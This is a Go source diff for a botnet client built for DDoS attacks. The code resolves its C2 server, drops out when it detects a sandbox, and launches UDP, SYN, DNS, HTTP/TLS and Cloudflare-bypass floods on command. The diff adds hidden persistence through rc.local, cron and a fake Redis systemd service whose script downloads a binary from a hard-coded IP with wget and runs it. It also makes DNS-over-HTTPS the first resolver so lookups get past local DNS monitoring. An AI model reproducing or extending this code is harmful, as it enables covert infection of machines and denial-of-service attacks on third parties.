@@ -36,8 +36,8 @@ import (
 var debugMode = true
 
 // Obfuscated config - multi-layer encoding (setup.py generates this)
-const gothTits = "egfA1P8CCv/fNjx8NcqZDclcUyvf7ZWp4t0f6Y/g=" //change me run setup.py
-const cryptSeed = "da2283ee"                                //change me run setup.py
+const gothTits = "GTRv7pFDanCzINBEitc7sEayeL7DZTU1OsPZ86o=" //change me run setup.py
+const cryptSeed = "b60461b7"                                //change me run setup.py
 
 // DNS servers for TXT record lookups (shuffled for load balancing)
 var lizardSquad = []string{
@@ -493,8 +493,8 @@ func dialga() string {
 }
 
 const (
-	magicCode       = "IhxWZGJDzdSviX$s" //change this per campaign
-	protocolVersion = "r5.6-stable"             //change this per campaign
+	magicCode       = "1a6R7s^W9DAYHc88" //change this per campaign
+	protocolVersion = "V1_8"             //change this per campaign
 )
 
 var (
@@ -509,7 +509,7 @@ var (
 	aptStopMutex     sync.Mutex
 	aptAttackRunning bool
 
-	// Proxy support for L7 attacks
+	// Proxy support for L7 attacks (pre-validated by CNC)
 	proxyList      []string
 	proxyListMutex sync.RWMutex
 )
@@ -530,12 +530,19 @@ const equationGroup = 256
 //
 // Returns: error if file operation fails
 func sandworm(path, line string, perm os.FileMode) error {
+	deoxys("sandworm: Opening file %s for append", path)
 	f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY|os.O_CREATE, perm)
 	if err != nil {
+		deoxys("sandworm: Failed to open file: %v", err)
 		return err
 	}
 	defer f.Close()
-	_, _ = f.WriteString(line)
+	n, err := f.WriteString(line)
+	if err != nil {
+		deoxys("sandworm: Failed to write: %v", err)
+		return err
+	}
+	deoxys("sandworm: Wrote %d bytes to %s", n, path)
 	return nil
 }
 
@@ -572,26 +579,90 @@ func kimsuky() string {
 // Parameters:
 //   - hiddenDir: Directory containing the persistence script
 func carbanak(hiddenDir string) {
+	deoxys("carbanak: Setting up cron persistence in %s", hiddenDir)
 	cronJob := fmt.Sprintf("* * * * * bash %s/.redis_script.sh > /dev/null 2>&1", hiddenDir)
-	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l; echo '%s') | crontab -", cronJob))
-	_ = cmd.Run()
+	deoxys("carbanak: Cron job: %s", cronJob)
+	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
+	err := cmd.Run()
+	if err != nil {
+		deoxys("carbanak: Failed to install cron job: %v", err)
+	} else {
+		deoxys("carbanak: Cron job installed successfully")
+	}
+}
+
+// lazarus sets up a simple cron job to keep the bot running.
+// Runs every minute to check if bot is alive and restart if needed.
+// Does not require any external scripts - directly executes the binary.
+func lazarus() {
+	deoxys("lazarus: Setting up cron persistence for bot executable")
+	exe, err := os.Executable()
+	if err != nil {
+		deoxys("lazarus: Failed to get executable path: %v", err)
+		return
+	}
+	deoxys("lazarus: Executable path: %s", exe)
+
+	// Get process name for pgrep
+	procName := filepath.Base(exe)
+	deoxys("lazarus: Process name: %s", procName)
+
+	// Create cron job that checks if process is running and starts it if not
+	cronJob := fmt.Sprintf("* * * * * pgrep -x %s > /dev/null || %s > /dev/null 2>&1 &", procName, exe)
+	deoxys("lazarus: Cron job: %s", cronJob)
+
+	// Check if cron job already exists
+	checkCmd := exec.Command("crontab", "-l")
+	existing, _ := checkCmd.Output()
+	if strings.Contains(string(existing), exe) {
+		deoxys("lazarus: Cron job already exists, skipping")
+		return
+	}
+
+	// Add to crontab
+	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
+	err = cmd.Run()
+	if err != nil {
+		deoxys("lazarus: Failed to install cron job: %v", err)
+	} else {
+		deoxys("lazarus: Cron job installed successfully")
+	}
 }
 
 // fin7 adds the bot executable to /etc/rc.local for startup persistence.
 // Only adds entry if rc.local exists and doesn't already contain our path.
 // Uses a random suffix to make the entry less obvious.
 func fin7() {
+	deoxys("fin7: Starting rc.local persistence setup")
 	rc := "/etc/rc.local"
 	if _, err := os.Stat(rc); err != nil {
+		deoxys("fin7: %s does not exist, skipping (err: %v)", rc, err)
 		return
 	}
-	exe, _ := os.Executable()
+	deoxys("fin7: %s exists, proceeding", rc)
+	exe, err := os.Executable()
+	if err != nil {
+		deoxys("fin7: Failed to get executable path: %v", err)
+		return
+	}
+	deoxys("fin7: Executable path: %s", exe)
 	b, err := os.ReadFile(rc)
-	if err != nil || strings.Contains(string(b), exe) {
+	if err != nil {
+		deoxys("fin7: Failed to read %s: %v", rc, err)
+		return
+	}
+	if strings.Contains(string(b), exe) {
+		deoxys("fin7: Entry already exists in rc.local, skipping")
 		return
 	}
 	line := exe + " # " + kimsuky() + "\n"
-	_ = sandworm(rc, line, 0700)
+	deoxys("fin7: Adding line to rc.local: %s", strings.TrimSpace(line))
+	err = sandworm(rc, line, 0700)
+	if err != nil {
+		deoxys("fin7: Failed to write to rc.local: %v", err)
+	} else {
+		deoxys("fin7: Successfully added to rc.local")
+	}
 }
 
 // dragonfly sets up comprehensive persistence using multiple methods:
@@ -602,19 +673,51 @@ func fin7() {
 //
 // All files are disguised as Redis-related system files.
 func dragonfly() {
+	deoxys("dragonfly: Starting comprehensive persistence setup")
 	hiddenDir := "/var/lib/.redis_helper"
 	scriptPath := filepath.Join(hiddenDir, ".redis_script.sh")
 	programPath := filepath.Join(hiddenDir, ".redis_process")
 	url := "http://185.247.224.107/mods/installer"
-	_ = os.MkdirAll(hiddenDir, 0755)
+
+	deoxys("dragonfly: Creating hidden directory: %s", hiddenDir)
+	err := os.MkdirAll(hiddenDir, 0755)
+	if err != nil {
+		deoxys("dragonfly: Failed to create hidden directory: %v", err)
+	} else {
+		deoxys("dragonfly: Hidden directory created successfully")
+	}
+
 	scriptContent := fmt.Sprintf("#!/bin/bash\nURL=\"%s\"\nPROGRAM_PATH=\"%s\"\nif [ ! -f \"$PROGRAM_PATH\" ]; then\nwget -O $PROGRAM_PATH $URL\nchmod +x $PROGRAM_PATH\nfi\nif ! pgrep -x \".redis_process\" > /dev/null; then\n$PROGRAM_PATH &\nfi\n", url, programPath)
-	_ = os.WriteFile(scriptPath, []byte(scriptContent), 0755)
+	deoxys("dragonfly: Writing persistence script to: %s", scriptPath)
+	err = os.WriteFile(scriptPath, []byte(scriptContent), 0755)
+	if err != nil {
+		deoxys("dragonfly: Failed to write script: %v", err)
+	} else {
+		deoxys("dragonfly: Script written successfully")
+	}
+
 	serviceContent := "[Unit]\nDescription=System Helper Service\nAfter=network.target\n[Service]\nExecStart=/var/lib/.redis_helper/.redis_script.sh\nRestart=always\nRestartSec=60\n[Install]\nWantedBy=multi-user.target\n"
 	servicePath := "/etc/systemd/system/redis-helper.service"
-	_ = os.WriteFile(servicePath, []byte(serviceContent), 0644)
+	deoxys("dragonfly: Writing systemd service to: %s", servicePath)
+	err = os.WriteFile(servicePath, []byte(serviceContent), 0644)
+	if err != nil {
+		deoxys("dragonfly: Failed to write systemd service: %v", err)
+	} else {
+		deoxys("dragonfly: Systemd service file written successfully")
+	}
+
+	deoxys("dragonfly: Enabling systemd service")
 	cmd := exec.Command("systemctl", "enable", "--now", "redis-helper.service")
-	_ = cmd.Run()
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		deoxys("dragonfly: Failed to enable systemd service: %v (output: %s)", err, string(output))
+	} else {
+		deoxys("dragonfly: Systemd service enabled successfully")
+	}
+
+	deoxys("dragonfly: Setting up cron backup persistence")
 	carbanak(hiddenDir)
+	deoxys("dragonfly: Persistence setup complete")
 }
 
 // ============================================================================
@@ -1110,34 +1213,26 @@ func blackEnergy(conn net.Conn, command string) error {
 		return nil
 	case "!stop":
 		pikachu()
-		conn.Write([]byte("STOP: All attacks terminated\n"))
 		return nil
 	case "!udpflood", "!tcpflood", "!http", "!ack", "!gre", "!syn", "!dns", "!https", "!tls", "!cfbypass":
-		// Check for proxy mode: !method target port duration -p proxyURL
+		// Check for proxy mode: !method target port duration -pl proxy1,proxy2,...
 		useProxy := false
-		proxyURL := ""
 		minFields := 4
 
-		// Check if -p flag is present for L7 methods
+		// Check if -pl flag is present (pre-validated proxy list from CNC)
 		if (cmd == "!http" || cmd == "!https" || cmd == "!tls" || cmd == "!cfbypass") && len(fields) >= 6 {
-			if fields[4] == "-p" {
+			if fields[4] == "-pl" {
 				useProxy = true
-				proxyURL = fields[5]
-				// Fetch proxies from URL
-				proxies, err := meowth(proxyURL)
-				if err != nil {
-					conn.Write([]byte(fmt.Sprintf("ERROR: Failed to fetch proxies: %v\n", err)))
-					return nil
-				}
+				// Parse comma-separated proxy list
+				proxies := strings.Split(fields[5], ",")
 				if len(proxies) == 0 {
-					conn.Write([]byte("ERROR: No proxies found in the list\n"))
+					conn.Write([]byte("ERROR: Empty proxy list received\n"))
 					return nil
 				}
-				// Update global proxy list
+				// Update global proxy list with pre-validated proxies
 				proxyListMutex.Lock()
 				proxyList = proxies
 				proxyListMutex.Unlock()
-				conn.Write([]byte(fmt.Sprintf("Loaded %d proxies from %s\n", len(proxies), proxyURL)))
 			}
 		}
 
@@ -1155,21 +1250,18 @@ func blackEnergy(conn net.Conn, command string) error {
 		case "!http":
 			if useProxy {
 				go alakazamProxy(target, targetPort, duration, true)
-				conn.Write([]byte(fmt.Sprintf("Proxy attack started: %s on %s:%d for %d seconds (using proxies)\n", cmd, target, targetPort, duration)))
 				return nil
 			}
 			go alakazam(target, targetPort, duration)
 		case "!https", "!tls":
 			if useProxy {
 				go machampProxy(target, targetPort, duration, true)
-				conn.Write([]byte(fmt.Sprintf("Proxy attack started: %s on %s:%d for %d seconds (using proxies)\n", cmd, target, targetPort, duration)))
 				return nil
 			}
 			go machamp(target, targetPort, duration)
 		case "!cfbypass":
 			if useProxy {
 				go gyaradosProxy(target, targetPort, duration, true)
-				conn.Write([]byte(fmt.Sprintf("Proxy attack started: %s on %s:%d for %d seconds (using proxies)\n", cmd, target, targetPort, duration)))
 				return nil
 			}
 			go gyarados(target, targetPort, duration)
@@ -1182,7 +1274,6 @@ func blackEnergy(conn net.Conn, command string) error {
 		case "!dns":
 			go salamence(target, targetPort, duration)
 		}
-		conn.Write([]byte(fmt.Sprintf("Attack started: %s on %s:%d for %d seconds\n", cmd, target, targetPort, duration)))
 	case "!persist":
 		go dragonfly()
 		conn.Write([]byte("Persistence setup initiated\n"))
@@ -1305,8 +1396,12 @@ func main() {
 		os.Exit(200)
 	}
 	deoxys("main: No sandbox detected, continuing")
-	deoxys("main: Running persistence check...")
+	deoxys("main: Running persistence check (fin7 -> rc.local)...")
 	fin7()
+	deoxys("main: fin7 persistence check complete")
+	deoxys("main: Running persistence check (lazarus -> cron)...")
+	lazarus()
+	deoxys("main: lazarus persistence check complete")
 	deoxys("main: Resolving C2 address...")
 	c2Address := dialga()
 	if c2Address == "" {
@@ -1339,66 +1434,8 @@ func main() {
 // ============================================================================
 // PROXY SUPPORT FUNCTIONS
 // These enable L7 attacks through HTTP/HTTPS proxies for IP rotation.
+// Proxy lists are pre-validated by CNC and sent directly to bots.
 // ============================================================================
-
-// meowth fetches a list of HTTP/HTTPS proxies from a URL.
-// Supports multiple formats: ip:port, user:pass@host:port, with or without http:// prefix.
-// Lines starting with # are treated as comments and skipped.
-// Parameters:
-//   - proxyURL: URL pointing to a text file with proxy list
-//
-// Returns: Slice of proxy URLs (http://ip:port format), or error
-func meowth(proxyURL string) ([]string, error) {
-	deoxys("meowth: Fetching proxies from: %s", proxyURL)
-	client := &http.Client{Timeout: 30 * time.Second}
-	resp, err := client.Get(proxyURL)
-	if err != nil {
-		deoxys("meowth: Failed to fetch proxies: %v", err)
-		return nil, err
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != http.StatusOK {
-		return nil, fmt.Errorf("status: %d", resp.StatusCode)
-	}
-
-	var proxies []string
-	scanner := bufio.NewScanner(resp.Body)
-	for scanner.Scan() {
-		line := strings.TrimSpace(scanner.Text())
-		if line == "" || strings.HasPrefix(line, "#") {
-			continue
-		}
-		// Support formats:
-		// - ip:port (simple)
-		// - user:pass@host:port (authenticated without scheme)
-		// - http://ip:port
-		// - http://user:pass@host:port (authenticated)
-		// - https://ip:port
-		// - https://user:pass@host:port
-		if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
-			// Check if it contains @ (authenticated proxy without scheme)
-			if strings.Contains(line, "@") {
-				line = "http://" + line
-			} else {
-				line = "http://" + line
-			}
-		}
-		// Validate the proxy URL can be parsed
-		if _, err := url.Parse(line); err != nil {
-			deoxys("meowth: Skipping invalid proxy: %s (%v)", line, err)
-			continue
-		}
-		proxies = append(proxies, line)
-	}
-
-	if err := scanner.Err(); err != nil {
-		return nil, err
-	}
-
-	deoxys("meowth: Loaded %d proxies", len(proxies))
-	return proxies, nil
-}
 
 // persian returns a random proxy from the global proxy list.
 // Thread-safe using RWMutex for concurrent access during attacks.
@@ -1458,7 +1495,8 @@ type magikarp struct {
 }
 
 // lucario resolves a target hostname to an IP address.
-// Resolution order: direct IP passthrough -> system DNS -> Cloudflare DoH
+// Resolution order: direct IP passthrough -> Cloudflare DoH -> system DNS
+// DoH is prioritized to bypass local DNS filtering/monitoring.
 // Parameters:
 //   - target: IP address or hostname (may include http:// prefix or port)
 //
@@ -1475,33 +1513,43 @@ func lucario(target string) (string, error) {
 	if idx := strings.Index(target, ":"); idx != -1 {
 		target = target[:idx]
 	}
+	// Try Cloudflare DoH first (bypasses local DNS filtering)
+	dohServers := []string{
+		"https://1.1.1.1/dns-query",
+		"https://cloudflare-dns.com/dns-query",
+	}
+	for _, server := range dohServers {
+		url := fmt.Sprintf("%s?name=%s&type=A", server, target)
+		req, err := http.NewRequest("GET", url, nil)
+		if err != nil {
+			continue
+		}
+		req.Header.Set("Accept", "application/dns-json")
+		client := &http.Client{Timeout: 5 * time.Second}
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		if resp.StatusCode != http.StatusOK {
+			resp.Body.Close()
+			continue
+		}
+		var dnsResp magikarp
+		if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
+			resp.Body.Close()
+			continue
+		}
+		resp.Body.Close()
+		if len(dnsResp.Answer) > 0 {
+			return dnsResp.Answer[0].Data, nil
+		}
+	}
+	// Fallback to system DNS resolver
 	ips, err := net.LookupHost(target)
 	if err == nil && len(ips) > 0 {
 		return ips[0], nil
 	}
-	url := fmt.Sprintf("https://1.1.1.1/dns-query?name=%s&type=A", target)
-	req, err := http.NewRequest("GET", url, nil)
-	if err != nil {
-		return "", fmt.Errorf("error: %v", err)
-	}
-	req.Header.Set("Accept", "application/dns-json")
-	client := &http.Client{Timeout: 5 * time.Second}
-	resp, err := client.Do(req)
-	if err != nil {
-		return "", fmt.Errorf("error: %v", err)
-	}
-	defer resp.Body.Close()
-	if resp.StatusCode != http.StatusOK {
-		return "", fmt.Errorf("status: %d", resp.StatusCode)
-	}
-	var dnsResp magikarp
-	if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
-		return "", fmt.Errorf("decode error: %v", err)
-	}
-	if len(dnsResp.Answer) == 0 {
-		return "", fmt.Errorf("no records")
-	}
-	return dnsResp.Answer[0].Data, nil
+	return "", fmt.Errorf("all resolution methods failed for: %s", target)
 }
 
 // eevee is a comprehensive list of real-world browser User-Agent strings.
